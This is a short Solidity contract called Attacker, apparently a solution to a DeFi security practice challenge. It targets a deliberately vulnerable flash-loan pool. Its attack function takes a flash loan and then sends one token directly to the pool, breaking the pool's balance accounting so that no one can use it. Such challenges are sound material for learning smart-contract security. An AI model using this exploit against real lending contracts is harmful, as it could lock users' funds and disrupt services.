// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {UnstoppableLender, IReceiver} from "./UnstoppableLender.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Attacker is IReceiver {
    address public immutable attacker;
    address public immutable target;
    address public immutable dvt;

    constructor(address _target, address _dvt) {
        attacker = msg.sender;
        target = _target;
        dvt = _dvt;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "only attacker");
        _;
    }

    function receiveTokens(address tokenAddress, uint256 amount) external override {
        require(msg.sender == target && tokenAddress == dvt);
        IERC20(dvt).transfer(msg.sender, amount);
    }

    function attack() external onlyAttacker {
        require(target != address(0) && dvt != address(0));
        UnstoppableLender(target).flashLoan(1);
        // make target.poolBalance != IERC20(dvt).balanceOf(target)
        IERC20(dvt).transferFrom(attacker, target, 1);
    }
}
